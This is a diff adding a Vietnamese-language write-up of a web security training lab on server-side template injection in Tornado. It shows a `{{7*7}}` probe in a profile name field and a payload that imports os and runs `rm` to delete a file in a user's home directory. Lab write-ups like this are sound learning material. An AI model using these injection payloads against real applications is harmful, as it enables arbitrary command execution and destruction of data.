@@ -36,4 +36,40 @@ LAB SOLVED!
 
 ![image](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/0c88bb34-9130-463c-aac1-822d3bba4ea8)
 
+***
+
+## 2. 
+
+* Content:
+```
+This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
+
+You can log in to your own account using the following credentials: wiener:peter
+```
+* Exploit:
+
+Nghiên cứu `Tornado template` => Sử dụng expression `{{ }}`
+
+Tập trung vào tính năng `Preferred name`:
+
+<img width="405" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/15203fc3-311a-4b63-979e-5389a5722ffd">
+
+Thay đổi giá trị submit lên là `user.name}}{{7*7}}`:
+
+<img width="451" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/3b7fb10b-e4f4-4d79-bd79-35dd16d419d9">
+
+Thực hiện post 1 comment lên và quan sát tên hiển thị => Thấy giá trị `49` xuất hiện, chứng tỏ vị trí `Preferred name` bị dính lỗi SSTI:
+
+<img width="374" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9ee75eb4-c649-4c6c-a8f8-29449b058fae">
+
+`Tornado template` sử dụng cú pháp sau để chạy lệnh OS => Áp dụng xóa file LAB yêu cầu:
+
+```
+{% import os %}
+{{os.system('rm /home/carlos/morale.txt')
+```
+
+LAB SOLVED!
+
+<img width="593" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/310cf722-87fa-4eba-8da3-2ee23d43fe6f">
 
